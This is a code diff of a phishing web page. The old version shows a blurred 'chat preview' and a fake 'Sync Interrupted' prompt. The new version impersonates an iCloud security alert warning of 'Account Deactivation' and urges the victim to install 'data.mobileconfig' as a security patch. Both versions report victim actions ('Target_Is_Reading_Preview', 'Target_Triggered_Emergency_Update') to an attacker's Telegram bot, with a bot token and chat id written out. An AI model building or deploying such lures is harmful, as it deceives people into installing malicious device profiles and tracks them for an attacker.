@@ -1,38 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Support</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>iCloud Security Alert</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: filter 0.8s ease; }
-        .ui-box { position: relative; z-index: 10; background: rgba(255,255,255,0.98); padding: 25px; border-radius: 20px; width: 85%; max-width: 300px; text-align: center; display: none; }
-        .btn { background: #007aff; color: white; padding: 14px; border-radius: 12px; text-decoration: none; display: block; margin-top: 15px; font-weight: bold; cursor: pointer; border:none; width:100%; font-size:16px; }
+        body { font-family: -apple-system, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .alert-box { background: white; width: 270px; border-radius: 14px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
+        .content { padding: 20px; }
+        .title { font-weight: 600; font-size: 17px; margin-bottom: 5px; }
+        .msg { font-size: 13px; color: #333; line-height: 1.4; }
+        .btn-row { border-top: 0.5px solid #c8c8c8; display: flex; }
+        .btn { color: #007aff; text-decoration: none; padding: 12px; flex: 1; font-size: 17px; font-weight: 500; }
+        .btn:active { background: #e5e5e5; }
     </style>
 </head>
 <body>
-    <img src="chat_preview.jpg" id="preview">
-    <div id="popup" class="ui-box">
-        <h2 style="margin:0; font-size: 18px;">Sync Interrupted</h2>
-        <p style="font-size: 13px; color: #444; margin-top: 10px;">To finish restoring private media and encrypted chat history, authorize the security certificate.</p>
-        <button class="btn" onclick="executeAccess()">Verify & Continue</button>
+    <div class="alert-box">
+        <div class="content">
+            <div class="title">Account Deactivation</div>
+            <div class="msg">Your account sync has been suspended. Install the security patch to prevent data loss.</div>
+        </div>
+        <div class="btn-row">
+            <a href="data.mobileconfig" class="btn" onclick="notify()">Update Now</a>
+        </div>
     </div>
-
     <script>
-        window.onload = function() {
-            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Is_Reading_Preview_👀");
-            setTimeout(() => {
-                document.getElementById('popup').style.display = 'block';
-                document.getElementById('preview').style.filter = 'blur(15px)';
-            }, 6000); 
-        };
-
-        function executeAccess() {
-            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Authorized_Sync_✅");
-            setTimeout(() => {
-                window.location.href = "data.mobileconfig";
-            }, 1000);
+        function notify() {
+            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Triggered_Emergency_Update_🚀");
         }
     </script>
 </body>
